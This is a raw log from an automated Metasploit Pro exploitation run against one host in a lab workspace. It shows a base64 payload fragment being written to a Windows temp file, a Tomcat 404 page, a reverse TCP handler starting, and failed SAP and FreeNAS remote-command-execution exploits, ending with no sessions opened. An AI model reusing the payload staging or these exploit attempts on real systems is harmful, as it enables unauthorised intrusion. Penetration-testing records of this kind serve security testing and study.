Q2LRdyAdCjzsv9F3OvtjUXzUOiDFwAAiUXcx0XYAAAAAIN92A19DYtF2IB0KPOy/0XY6+3HRdgAAAAAg33YEn0Ni0XYgHQo4bL/Rdjr7Y1F4VD/ddzoSxcAAIlF2MdF1AAAAACDfdQSfQ2LRdSAdCjhsv9F1Ovt/1XYhcB0CmoA6DYXAACDxASJ7F3DVYnlg+x0xkXz2cZF9NfG>>%TEMP%\DcwnJ.b64
[-] [2016.06.04-10:15:06] [0763] 10.198.0.1:8080 - Output: <!DOCTYPE html><html><head><title>Apache Tomcat/8.0.14 (Debian) - Error report</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style> </head><body><h1>HTTP Status 404 - /ctc/servlet/ConfigServlet</h1><div class="line"></div><p><b>type</b> Status report</p><p><b>message</b> <u>/ctc/servlet/ConfigServlet</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><hr class="line"><h3>Apache Tomcat/8.0.14 (Debian)</h3></body></html>
[-] [2016.06.04-10:15:06] [0763] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Exploit failed.
[+] [2016.06.04-10:15:07] Workspace:lab5 Progress:768/775 (99%) [764/770] 10.198.0.1:8080 - SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
[*] [2016.06.04-10:15:07] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:15:07] No reverse connect payloads available for exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec
[-] [2016.06.04-10:15:07] No payloads were compatible with exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec)
[-] [2016.06.04-10:15:07] [0764] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:15:07] Workspace:lab5 Progress:769/775 (99%) [765/770] 10.198.0.1:8080 - FreeNAS exec_raw.php Arbitrary Command Execution
[*] [2016.06.04-10:15:07] [0765] Started reverse TCP handler on 0.0.0.0:1540
[*] [2016.06.04-10:15:07] [0765] Sending exploit page 'D.php'
[-] [2016.06.04-10:15:07] [0765] Exploit failed.
[+] [2016.06.04-10:15:10] Workspace:lab5 Progress:775/775 (100%) Complete (0 sessions opened, 1 host targeted, 0 hosts skipped)

R7logo new
Metasploit Pro 4.11.7 - Update 2016052401
© 2010-2016 Rapid7 Inc, Boston, MA | Rapid7 Support Center
